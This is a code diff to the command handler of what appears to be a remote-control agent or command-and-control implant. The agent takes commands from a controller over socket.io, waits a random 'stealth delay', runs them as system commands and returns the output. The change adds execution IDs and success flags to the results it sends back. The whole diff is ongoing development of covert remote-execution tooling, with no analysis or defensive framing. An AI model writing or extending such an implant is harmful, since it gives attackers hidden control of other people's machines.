@@ -10361,16 +10361,18 @@ def on_execute_command(data):
     
     agent_id = data.get('agent_id')
     command = data.get('command')
+    execution_id = data.get('execution_id')  # ✅ GET execution_id from UI
     
     # Verify this command is for us
     our_agent_id = get_or_create_agent_id()
     if agent_id != our_agent_id:
         return  # Not for this agent
     
-    log_message(f"[EXECUTE_COMMAND] Received: {command}")
+    log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
     
     # Execute the command using the same logic as on_command
     output = ""
+    success = True
     
     # Add stealth delay
     sleep_random_non_blocking()
@@ -10393,18 +10395,25 @@ def on_execute_command(data):
                 output = f"Command '{command}' executed successfully"
         except Exception as e:
             output = f"Error executing '{command}': {e}"
+            success = False
     else:
         # Execute as system command
         try:
             output = execute_command(command)
+            if not output:
+                output = "(command completed with no output)"
         except Exception as e:
             output = f"Command execution error: {e}"
+            success = False
     
-    # Send output back to controller
-    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars)")
+    # Send output back to controller WITH execution_id
+    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
     sio.emit('command_result', {
         'agent_id': our_agent_id,
+        'execution_id': execution_id,  # ✅ INCLUDE execution_id in response
+        'command': command,  # ✅ INCLUDE original command
         'output': output,
+        'success': success,
         'timestamp': time.time()
     })
 
